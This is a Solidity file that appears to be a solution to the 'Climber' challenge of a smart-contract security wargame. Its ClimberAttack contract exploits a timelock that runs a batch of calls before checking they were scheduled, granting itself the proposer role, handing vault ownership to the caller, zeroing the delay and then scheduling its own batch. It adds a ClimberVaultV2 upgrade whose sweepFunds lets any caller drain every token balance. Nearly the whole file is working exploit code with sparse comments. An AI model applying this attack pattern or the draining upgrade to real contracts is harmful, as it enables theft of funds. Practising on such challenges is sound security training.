// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { ClimberTimelock } from "../climber/ClimberVault.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";
// I'm guessing we have to reinitialize the contract and set ourselves as the sweeper
// constructor is only called once, even if it's reinialized
contract ClimberAttack{
    address payable private immutable timelock;
    uint256[] private values = [0,0,0,0];
    address[] private targets = new address[](4);
    bytes[] private dataElements = new bytes[](4);




constructor(address payable _timelock, address _vault){
    timelock = _timelock;
    targets = [_timelock, _vault, _timelock, address(this)];

    //We set up our array to be run in the timelock execute function - works as long as we have our proposer role at the end of execution.
    dataElements[0] =( abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));
    dataElements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
    dataElements[2] = abi.encodeWithSignature("updateDelay(uint64)",0 hours);
    //we are making the execute function call our schedule function on this contract
    dataElements[3] = abi.encodeWithSignature("scheduleBreak()");
}

function attack() external{
    ClimberTimelock(timelock).execute(targets,values,dataElements, bytes32("salt"));
}

function scheduleBreak() external {
    ClimberTimelock(timelock).schedule(targets,values,dataElements, bytes32("salt"));
}

/*
function updateBreak() external {
    ClimberTimelock(timelock).updateDelay(0);
}*/

}

contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function sweepFunds(address token) external {
        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
    }
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}

}